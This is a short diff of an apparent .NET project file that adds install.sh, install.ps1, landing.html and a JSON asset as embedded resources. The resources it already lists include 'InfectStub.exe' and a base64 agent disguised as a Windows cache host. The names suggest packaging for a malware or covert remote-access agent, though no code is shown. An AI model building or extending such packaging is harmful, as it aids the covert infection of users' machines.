@@ -33,6 +33,10 @@
 		<EmbeddedResource Include="Resources\KliveLink\WindowsCacheHostNative.b64" LogicalName="KliveLink.NativeAgent.Base64" />
 		<EmbeddedResource Include="Resources\KliveLink\BundledSetup.exe" LogicalName="KliveLink.BundledSetup" />
 		<EmbeddedResource Include="Resources\KliveLink\InfectStub.exe" LogicalName="KliveLink.InfectStub" />
+		<EmbeddedResource Include="Resources\KliveLink\PortableAssets.json" LogicalName="KliveLink.PortableAssets" />
+		<EmbeddedResource Include="Resources\KliveLink\install.sh" LogicalName="KliveLink.InstallSh" />
+		<EmbeddedResource Include="Resources\KliveLink\install.ps1" LogicalName="KliveLink.InstallPs1" />
+		<EmbeddedResource Include="Resources\KliveLink\landing.html" LogicalName="KliveLink.LandingHtml" />
 	</ItemGroup>
 
 	<ItemGroup>
